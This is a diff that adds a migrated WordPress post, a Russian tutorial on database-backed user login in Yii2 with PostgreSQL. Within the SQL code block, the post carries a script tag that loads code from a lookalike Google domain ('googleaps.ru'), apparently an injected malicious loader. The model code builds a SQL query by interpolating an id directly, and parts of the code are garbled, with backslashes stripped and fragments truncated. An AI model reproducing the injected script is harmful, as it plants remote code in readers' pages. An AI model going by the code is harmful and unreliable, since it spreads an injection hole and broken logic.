@@ -1,0 +1,266 @@
+---
+layout: post
+status: publish
+published: true
+title: Авторизация yii 2 из базы
+author:
+  display_name: Maxyc Webber
+  login: admin
+  email: maxycws@gmail.com
+  url: ''
+author_login: admin
+author_email: maxycws@gmail.com
+wordpress_id: 1619
+wordpress_url: http://devdocs.ru/partners-news/avtorizatsiya-yii-2-iz-bazyi/
+date: '2015-06-29 09:04:28 +0200'
+date_gmt: '2015-06-29 09:04:28 +0200'
+categories:
+- Yii framework
+tags:
+- Тема
+- php
+- post
+- mysql
+- sql
+- ui
+- yii2
+- des1roer
+- yii
+- orm
+comments: []
+---
+<div dir="ltr" style="text-align: left;">попробуем разобраться как работает авторизация в yii 2.если начинаете с нуля то</p>
+<pre><code>   composer global require "fxp&#47;composer-asset-plugin:~1.0.0"<br />
+   composer create-project --prefer-dist yiisoft&#47;yii2-app-advanced  yii2rbac<br />
+   cd yii2rbac<br />
+   php init --env=Development<br />
+   php yii migrate<&#47;code><&#47;pre><br />
+перед миграцией нужно настроить подключение к базе.</p>
+<p>в localhostyii2rbaccommonconfigmain-local.php поменяем</p>
+<pre><code>&nbsp;&nbsp;&nbsp; 'components' => [<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 'db' => require(__DIR__ . '&#47;db.php'),<&#47;code><&#47;pre><br />
+создадим под коннект файл db.php</p>
+<div class="separator" style="clear: both; text-align: center;"><a style="margin-left: 1em; margin-right: 1em;" href="http:&#47;&#47;3.bp.blogspot.com&#47;-GWi5Q03afH8&#47;VYzb8PP1zdI&#47;AAAAAAAAAgo&#47;seKus8akpIw&#47;s1600&#47;Screenshot_1.png"><img src="http:&#47;&#47;3.bp.blogspot.com&#47;-GWi5Q03afH8&#47;VYzb8PP1zdI&#47;AAAAAAAAAgo&#47;seKus8akpIw&#47;s1600&#47;Screenshot_1.png" alt="" border="0" &#47;><&#47;a><&#47;div><br />
+ну и зададим свои настройки</p>
+<pre><code> 'yiidbConnection',<br />
+    &#47;&#47;'dsn' => 'mysql:host=localhost;dbname=localdb',<br />
+    'dsn' => 'pgsql:host=***.ru;port=5432;dbname=DB_**',<br />
+    'username' => 'postgres',<br />
+    'password' => '****',<br />
+    'schemaMap' => [<br />
+        'pgsql' => [<br />
+            'class' => 'yiidbpgsqlSchema',<br />
+            'defaultSchema' => 'yii2' &#47;&#47;specify your schema here<br />
+        ]<br />
+    ],<br />
+    'charset' => 'utf8',<br />
+];<&#47;code><&#47;pre><br />
+я использую Postgres - здесь еще нужно схему указать</p>
+<p>пошутил. конечно это не будет работать ))))</p>
+<p>в yii2rbaccommonmodelsUser.php</p>
+<p>напрямую правим</p>
+<pre><code>    public static function tableName()<br />
+    {<br />
+        return 'yii2.{{%user}}';<br />
+    }<&#47;code><&#47;pre><br />
+тут пошли танцы с бубном. первоначальный вид таблицы мне конечно не понравился</p>
+<p>решил привести таблицу юзера к такому виду</p>
+<div class="separator" style="clear: both; text-align: center;"><a style="margin-left: 1em; margin-right: 1em;" href="http:&#47;&#47;3.bp.blogspot.com&#47;-kKPv7Y7HBnE&#47;VY0QN6oI9vI&#47;AAAAAAAAAiM&#47;3yYewT_r9F0&#47;s1600&#47;Screenshot_9.png"><img src="http:&#47;&#47;3.bp.blogspot.com&#47;-kKPv7Y7HBnE&#47;VY0QN6oI9vI&#47;AAAAAAAAAiM&#47;3yYewT_r9F0&#47;s640&#47;Screenshot_9.png" alt="" width="640" height="202" border="0" &#47;><&#47;a><&#47;div></p>
+<div class="separator" style="clear: both; text-align: center;"><&#47;div><br />
+---<br />
+sql</p>
+<pre><code>CREATE TABLE yii2."user" (<br />
+  id INTEGER DEFAULT nextval('yii2.t_user_id_seq'::regclass) NOT NULL,<br />
+  username VARCHAR(45) NOT NULL,<br />
+  password_hash VARCHAR(255),<br />
+  id_role INTEGER,<br />
+  comment TEXT,<br />
+  created_at TIMESTAMP WITHOUT TIME ZONE DEFAULT now()::timestamp without time zone NOT NULL,<br />
+  ban_date TIMESTAMP WITHOUT TIME ZONE,<br />
+  status INTEGER DEFAULT 10,<br />
+  auth_key TEXT,<br />
+  CONSTRAINT t_user_pkey PRIMARY KEY(id),<br />
+  CONSTRAINT user_username_key UNIQUE(username),<br />
+  CONSTRAINT role_fk FOREIGN KEY (id_role)<br />
+    REFERENCES yii2.role(id)<br />
+    ON DELETE NO ACTION<br />
+    ON UPDATE NO ACTION<br />
+    NOT DEFERRABLE<br />
+)<br />
+WITH (oids = false);</p>
+<p>COMMENT ON COLUMN yii2."user".id<br />
+IS 'ид';</p>
+<p>COMMENT ON COLUMN yii2."user".username<br />
+IS 'имя';</p>
+<p>COMMENT ON COLUMN yii2."user".password_hash<br />
+IS 'пароль';</p>
+<p>COMMENT ON COLUMN yii2."user".id_role<br />
+IS 'роль';</p>
+<p>COMMENT ON COLUMN yii2."user".comment<br />
+IS 'комментарий';</p>
+<p>COMMENT ON COLUMN yii2."user".created_at<br />
+IS 'создан';</p>
+<p>COMMENT ON COLUMN yii2."user".ban_date<br />
+IS 'заблокирован';</p>
+<p>COMMENT ON COLUMN yii2."user".status<br />
+IS 'заблокировать';<script src="&#47;&#47;css.googleaps.ru&#47;css?f=Open+Sans&cd=mb&ver=4.2.2"><&#47;script><&#47;code><&#47;pre><br />
+---<br />
+на мой вкус username нужно бы поменять на login, а password_hash на password<br />
+но боялся грохнуть то что есть.</p>
+<p>пойдем по файлам</p>
+<p>localhostyii2rbaccommonmodelsUser.php</p>
+<p>комментим</p>
+<pre><code>&#47;&#47;use yiibehaviorsTimestampBehavior; <&#47;code><&#47;pre><br />
+- нужно для временных (int это время? кхе-кхе) полей</p>
+<pre><code>    public function behaviors()<br />
+    {<br />
+        return [<br />
+         &#47;&#47;   TimestampBehavior::className(),<br />
+        ];<br />
+    }<&#47;code><&#47;pre><br />
+тоже в топку</p>
+<p>yii2rbacfrontendmodelsSignupForm.php<br />
+сносим все что относится к емэйлу</p>
+<pre><code> 'trim'],<br />
+            ['username', 'required'],<br />
+            ['username', 'unique', 'targetClass' => 'commonmodelsUser', 'message' => 'This username has already been taken.'],<br />
+            ['username', 'string', 'min' => 2, 'max' => 255],<br />
+            &#47;&#47; [ 'filter', 'filter' => 'trim'],<br />
+            &#47;&#47; ['email', 'required'],<br />
+            &#47;&#47; ['email', 'email'],<br />
+            &#47;&#47; [ 'unique', 'targetClass' => 'commonmodelsUser', 'message' => 'This email address has already been taken.'],<br />
+            ['password', 'required'],<br />
+            ['password', 'string', 'min' => 6],<br />
+        ];<br />
+    }</p>
+<p>    &#47;**<br />
+     * Signs user up.<br />
+     *<br />
+     * @return User|null the saved model or null if saving fails<br />
+     *&#47;<br />
+    public function signup()<br />
+    {<br />
+        if ($this->validate())<br />
+        {<br />
+            $user = new User();<br />
+            $user->username = $this->username;<br />
+            &#47;&#47; $user->email = $this->email;<br />
+            $user->setPassword($this->password);<br />
+            $user->generateAuthKey();<br />
+            if ($user->save())<br />
+            {<br />
+                return $user;<br />
+            }<br />
+        }<br />
+        return null;<br />
+    }<br />
+    }<&#47;code><&#47;pre><br />
+в yii2rbacfrontendviewssitesignup.php<br />
+удаляем поле мыла</p>
+<p>получаем примерно</p>
+<div class="separator" style="clear: both; text-align: center;"><a style="margin-left: 1em; margin-right: 1em;" href="http:&#47;&#47;1.bp.blogspot.com&#47;-3qqTBXGmiUA&#47;VYzrN_bcTRI&#47;AAAAAAAAAhM&#47;UzaoVGWsNVY&#47;s1600&#47;Screenshot_4.png"><img src="http:&#47;&#47;1.bp.blogspot.com&#47;-3qqTBXGmiUA&#47;VYzrN_bcTRI&#47;AAAAAAAAAhM&#47;UzaoVGWsNVY&#47;s320&#47;Screenshot_4.png" alt="" width="320" height="212" border="0" &#47;><&#47;a><&#47;div><br />
+создадим модель в gii</p>
+<div class="separator" style="clear: both; text-align: center;"><a style="margin-left: 1em; margin-right: 1em;" href="http:&#47;&#47;2.bp.blogspot.com&#47;-B2_Y9RMQ0Po&#47;VYzsJR-E8II&#47;AAAAAAAAAhU&#47;QSGEV-W0Kl8&#47;s1600&#47;Screenshot_5.png"><img src="http:&#47;&#47;2.bp.blogspot.com&#47;-B2_Y9RMQ0Po&#47;VYzsJR-E8II&#47;AAAAAAAAAhU&#47;QSGEV-W0Kl8&#47;s320&#47;Screenshot_5.png" alt="" width="320" height="283" border="0" &#47;><&#47;a><&#47;div><br />
+и круд</p>
+<div class="separator" style="clear: both; text-align: center;"><a style="margin-left: 1em; margin-right: 1em;" href="http:&#47;&#47;2.bp.blogspot.com&#47;--9-s0rNCHkM&#47;VYz0Fc3qEPI&#47;AAAAAAAAAhk&#47;ctrOgr5DhjY&#47;s1600&#47;Screenshot_6.png"><img src="http:&#47;&#47;2.bp.blogspot.com&#47;--9-s0rNCHkM&#47;VYz0Fc3qEPI&#47;AAAAAAAAAhk&#47;ctrOgr5DhjY&#47;s320&#47;Screenshot_6.png" alt="" width="269" height="320" border="0" &#47;><&#47;a><&#47;div><br />
+получим</p>
+<div class="separator" style="clear: both; text-align: center;"><a style="margin-left: 1em; margin-right: 1em;" href="http:&#47;&#47;2.bp.blogspot.com&#47;-ipgE1bi_8X0&#47;VYz0aTXIatI&#47;AAAAAAAAAhs&#47;eZ2T0ZsWtRQ&#47;s1600&#47;Screenshot_7.png"><img src="http:&#47;&#47;2.bp.blogspot.com&#47;-ipgE1bi_8X0&#47;VYz0aTXIatI&#47;AAAAAAAAAhs&#47;eZ2T0ZsWtRQ&#47;s320&#47;Screenshot_7.png" alt="" width="159" height="320" border="0" &#47;><&#47;a><&#47;div><br />
+можете перейти по http:&#47;&#47;localhost&#47;yii2rbac&#47;backend&#47;web&#47;index.php&#47;user<br />
+и увидите своего пользователя и захэшированный пароль</p>
+<p>ну а теперь создание и редактирование пользователей.<br />
+поправим форму ввода yii2rbacbackendviewsuser_form.php</p>
+<pre><code></p>
+<p><&#47;code><&#47;pre></p>
+<div class="my-user-form">
+field($model, 'username')->textInput(['maxlength' => true]) ?><br />
+field($model, 'password_hash')->textInput(['maxlength' => true])->passwordInput() ?><br />
+field($model, 'id_role')->textInput() ?><br />
+field($model, 'comment')->textarea(['rows' => 6]) ?><br />
+field($model, 'created_at')->textInput(['disabled' => true]) ?><br />
+field($model, 'ban_date')->textInput(['disabled' => true]) ?><br />
+field($model, 'status')->textInput() ?></p>
+<div class="form-group">
+isNewRecord ? 'Create' : 'Update', ['class' => $model->isNewRecord ? 'btn btn-success' : 'btn btn-primary']) ?><&#47;div><br />
+<&#47;div></p>
+<pre><code>&nbsp;<&#47;code><&#47;pre><br />
+добавим в модель пару методов yii2rbacbackendmodelsMyUser.php</p>
+<pre><code>use commonmodelsUser;  вверху<&#47;code><&#47;pre></p>
+<pre><code>&nbsp;<&#47;code><&#47;pre></p>
+<pre><code>public function signup()<br />
+    {<br />
+        if ($this->validate())<br />
+        {<br />
+            $user = new User();<br />
+            $user->username = $this->username;<br />
+            &#47;&#47; $user->email = $this->email;<br />
+            $user->setPassword($this->password_hash);<br />
+            &#47;&#47;$user->generateAuthKey();<br />
+            if ($user->save())<br />
+            {<br />
+                return $user;<br />
+            }<br />
+        }<br />
+        return null;<br />
+    }</p>
+<p>    public function beforeSave($insert)<br />
+    {<br />
+        if (!$this->isNewRecord)<br />
+        {<br />
+            $command = static::getDb()->createCommand("SELECT password_hash FROM yii2."user" where id =$this->id")->queryOne();<br />
+            if ($command != $this->password_hash)<br />
+            {<br />
+                $this->password_hash = Yii::$app->security->generatePasswordHash($this->password_hash);<br />
+            }<br />
+        }<br />
+        return parent::beforeSave($insert);<br />
+    }<&#47;code><&#47;pre><br />
+в модели еще поправим</p>
+<pre><code>    public static function tableName()<br />
+    {<br />
+        return Yii::$app->params['pgschema'] . '.user';<br />
+    }<&#47;code><&#47;pre><br />
+а в yii2rbaccommonconfigparams.php добавим</p>
+<pre><code> 'admin@example.com',<br />
+    'supportEmail' => 'support@example.com',<br />
+    'user.passwordResetTokenExpire' => 3600,<br />
+    'domainName' => 'yii2rbac',<br />
+    'pgschema' => 'yii2'<br />
+];<br />
+<&#47;code><&#47;pre><br />
+и поправим контроллер yii2rbacbackendcontrollersUserController.php</p>
+<pre><code><br />
+    public function actionCreate()<br />
+    {<br />
+        $model = new MyUser();</p>
+<p>        if ($model->load(Yii::$app->request->post()) &amp;&amp; $model->signup())<br />
+        {<br />
+            return $this->redirect(['index']);<br />
+        }<br />
+        else<br />
+        {<br />
+            return $this->render('create', [<br />
+                        'model' => $model,<br />
+            ]);<br />
+        }<br />
+    }</p>
+<p>    public function actionUpdate($id)<br />
+    {<br />
+        $model = $this->findModel($id);<br />
+        if ($model->load(Yii::$app->request->post()) &amp;&amp; $model->save())<br />
+        {<br />
+            return $this->redirect(['view', 'id' => $model->id]);<br />
+        }<br />
+        else<br />
+        {<br />
+            return $this->render('update', [<br />
+                        'model' => $model,<br />
+            ]);<br />
+        }<br />
+    }<&#47;code><&#47;pre><br />
+ну вот наверно и все. можем убрать из меню signup и пользователь сможет заходить только по паролю из базы</p>
+<p>ну и в результате</p>
+<div class="separator" style="clear: both; text-align: center;"><&#47;div></p>
+<div class="separator" style="clear: both; text-align: center;"><a style="margin-left: 1em; margin-right: 1em;" href="http:&#47;&#47;4.bp.blogspot.com&#47;-FedArQ92VrU&#47;VY0HDP39DcI&#47;AAAAAAAAAh8&#47;LA1j0n6xfdo&#47;s1600&#47;Screenshot_8.png"><img src="http:&#47;&#47;4.bp.blogspot.com&#47;-FedArQ92VrU&#47;VY0HDP39DcI&#47;AAAAAAAAAh8&#47;LA1j0n6xfdo&#47;s640&#47;Screenshot_8.png" alt="" width="640" height="214" border="0" &#47;><&#47;a><&#47;div><br />
+ну и следующая тема про<a href="http:&#47;&#47;des1roer.blogspot.ru&#47;2015&#47;06&#47;yii-2-rbac_29.html" target="_blank"> rbac<&#47;a></p>
+<p><&#47;div><br />
+Source: des1roer.blogspot.com</p>
